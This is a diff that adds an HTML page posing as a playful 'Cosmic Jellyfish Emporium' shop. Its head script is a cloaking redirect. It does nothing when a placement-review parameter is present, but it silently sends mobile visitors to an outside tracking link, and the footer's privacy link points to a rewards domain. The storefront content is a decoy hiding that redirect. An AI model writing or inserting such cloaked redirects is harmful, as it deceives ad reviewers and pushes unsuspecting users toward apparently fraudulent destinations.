@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            grid-column: 3 / 4;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        .neon {
+            animation: neon 1.5s ease-in-out infinite alternate;
+        }
+        @keyframes neon {
+            from {
+                text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff, 0 0 20px #ff00de, 0 0 35px #ff00de, 0 0 40px #ff00de, 0 0 50px #ff00de, 0 0 75px #ff00de;
+            }
+            to {
+                text-shadow: 0 0 2.5px #fff, 0 0 5px #fff, 0 0 7.5px #fff, 0 0 10px #ff00de, 0 0 17.5px #ff00de, 0 0 20px #ff00de, 0 0 25px #ff00de, 0 0 37.5px #ff00de;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1 class="neon">Cosmic Jellyfish Emporium</h1>
+        </header>
+        <main>
+            <h2>Welcome to the Underwater Cosmos</h2>
+            <p>Explore the mystical realm where bioluminescent jellyfish dance among the stars. Our emporium offers a unique blend of aquatic and celestial wonders.</p>
+            <ul>
+                <li>Stellar Tentacle Lamps</li>
+                <li>Nebula Jelly Aquariums</li>
+                <li>Galactic Polyp Pillows</li>
+            </ul>
+        </main>
+        <aside>
+            <h3>Did You Know?</h3>
+            <p>Some species of jellyfish are believed to be biologically immortal. They can revert to their juvenile state after reaching maturity, potentially living forever!</p>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Jellyfish Emporium | <a href="https://tokreward.com/privacy.html" style="color: #00ffff;">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
